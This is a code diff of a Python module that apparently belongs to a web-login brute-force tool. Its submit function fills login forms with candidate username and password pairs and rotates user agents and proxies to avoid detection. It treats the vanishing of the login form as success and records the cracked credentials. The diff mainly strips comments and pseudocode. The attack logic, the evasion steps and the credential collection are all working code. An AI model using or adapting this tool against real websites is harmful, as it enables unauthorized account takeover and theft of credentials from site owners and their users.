@@ -1,36 +1,7 @@
-"""
-	for (usr, passwd) in (usernames, passwords):
-		print_progress_bar()
-		tryLogin (url, usr, passwd, options):
-			if options._verbose_:
-				print "trying usr:passwd"
-			if _success_:
-				creds.append(usr:passwd)
-				remove(usr)
-				print usr:passwd
-			elif _error_:
-				stop():
-			else:
-				pass
-	print creds
-"""
-# TODO break task after matching
-# BUG Redirect error after successful: keep sending to login page
-# BUG Redirect error after successful: HTTPError w/ login page (no redirect param) WP - broken web app
-# BUG login fail redirect to message page (Using keyfalse option as optional condition)
-
 import mechanize
 from core import utils, actions, tbrowser		
 
 def submit(optionURL, tryCred, setProxyList, setKeyFalse, optionVerbose, loginInfo, result):
-	############################################
-	#	Old code logic:
-	#		Create 1 browser object per password
-	#	Current:
-	#		Create 1 browser object per username
-	#		Pick 1 user agent per password try
-	#
-	############################################
 
 	#	Get login form field informations
 	frmLoginID, frmFields = loginInfo
@@ -38,63 +9,40 @@ def submit(optionURL, tryCred, setProxyList, setKeyFalse, optionVerbose, loginIn
 	
 	proc = tbrowser.startBrowser()
 
-	#	Get single Password, remove \n
-
-	#	New test code block: add new user_agent each try
 	user_agent = tbrowser.useragent()
 	proc.addheaders = [('User-Agent', user_agent)]
 	
 	for cred in list(result.queue):
 		if tryUsername == cred[0]:
-			# if optionVerbose:
-			# 	utils.printf("Canceled: %s:%s" %(tryUsername, tryPassword))
 			return 0 # don't run if find password of username
 	
 	if setProxyList:
 		#Set proxy connect
 		proxyAddr = actions.randomFromList(setProxyList)
-		#utils.printf("Debug: proxy addr %s" %(proxyAddr))
+		if optionVerbose:
+			utils.printf("Proxy: %s" %(proxyAddr))
 		proc.set_proxies({"http": proxyAddr})
 
 	proc.open(optionURL)
-		#	End new code block
 	
 	try:
 
 		#	Select login form
 		proc.select_form(nr = frmLoginID)
+		
 		# FILLS ALL FIELDS https://stackoverflow.com/a/5389578
-		"""
-			>>> def craft(x, z):
-					for a, b in zip(x, z):
-						print "%s:%s" %(a,b)
-
-			>>> fields = ["fUsername", "fPasswd"]
-			>>> craft(fields, send)
-			fUsername:tryUsername
-			fPasswd:tryPasswd
-			>>> craft(fields, send)
-			fPasswd:tryUsername
-		"""
 		
 		for field, cred in zip(frmFields, tryCred):
 			proc.form[field] = cred
-		
-		# proc.form[frmUserfield] = tryUsername
-		# proc.form[frmPassfield] = tryPassword
-
 
 		#	Send request
 		proc.submit()
 
-		#	Print status bar
 		if optionVerbose:
 			utils.printf("Trying: %s:%s" %(tryUsername, tryPassword), 'norm')
 			if setProxyList:
 				utils.printf("Using proxy: %s" %(proxyAddr), 'norm')
 		
-
-		#proc.submit()
 		#	Reload - useful for redirect to dashboard
 		proc.reload()
 		#	If no login form -> success
@@ -112,7 +60,6 @@ def submit(optionURL, tryCred, setProxyList, setKeyFalse, optionVerbose, loginIn
 					result.put([tryUsername, tryPassword])
 
 					#	Clear object and try new username
-					#proc.close()
 
 				else:
 					if optionVerbose:
@@ -123,7 +70,6 @@ def submit(optionURL, tryCred, setProxyList, setKeyFalse, optionVerbose, loginIn
 				result.put([tryUsername, tryPassword])
 
 				#	Clear object and try new username
-				#proc.close()
 		else:
 			if optionVerbose:
 				utils.printf("[-] Failed: %s:%s" %(tryUsername, tryPassword), "bad")
@@ -133,8 +79,8 @@ def submit(optionURL, tryCred, setProxyList, setKeyFalse, optionVerbose, loginIn
 		if optionVerbose:
 			utils.printf("[x] Error: %s:%s\n%s" %(tryUsername, tryPassword, error), "bad")
 		return False
-	except Exception as error:
-		
+
+	except Exception as error:		
 		if optionVerbose:
 			utils.printf("[x] Error: %s:%s\n%s" %(tryUsername, tryPassword, error), "bad")
 		return False
